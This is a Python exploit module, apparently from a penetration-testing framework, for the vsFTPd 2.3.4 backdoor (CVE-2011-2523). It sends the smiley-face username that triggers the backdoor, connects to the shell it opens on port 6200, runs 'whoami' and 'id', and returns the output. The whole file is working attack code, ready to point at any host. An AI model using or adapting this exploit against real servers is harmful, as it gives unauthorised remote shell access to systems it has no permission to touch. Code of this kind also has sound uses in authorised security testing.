from project.workers.os.exploit.base import BaseExploit
from telnetlib import Telnet


class VsftpdExploit(BaseExploit):
    name = "cve-2011-2523"

    USER = "USER :)%"
    PASSWORD = "PASSWORD pass"
    COMMANDS = ["whoami", "id"]

    def run(self, **kwargs):
        host = kwargs.get("host", "127.0.0.1")
        ftp_port = kwargs.get("ftp_port", 21)
        several_ftp_port = kwargs.get("several_ftp_port", 6200)

        ftp_tn = Telnet(host, ftp_port)
        ftp_tn.read_until(b"(vsFTPd 2.3.4)")
        ftp_tn.write(self.USER.encode("ascii") + b"\n")
        ftp_tn.read_until(b"password.")
        ftp_tn.write(self.PASSWORD.encode("ascii") + b"\n")

        several_ftp_tn = Telnet(host, several_ftp_port)

        messages = []
        for command in self.COMMANDS:
            several_ftp_tn.write(command.encode("ascii") + b"\n")
            read_bytes = several_ftp_tn.read_some()
            messages.append(
                {
                    "command": command,
                    "message": read_bytes.decode("utf-8").strip()
                }
            )

        return {"result": messages}




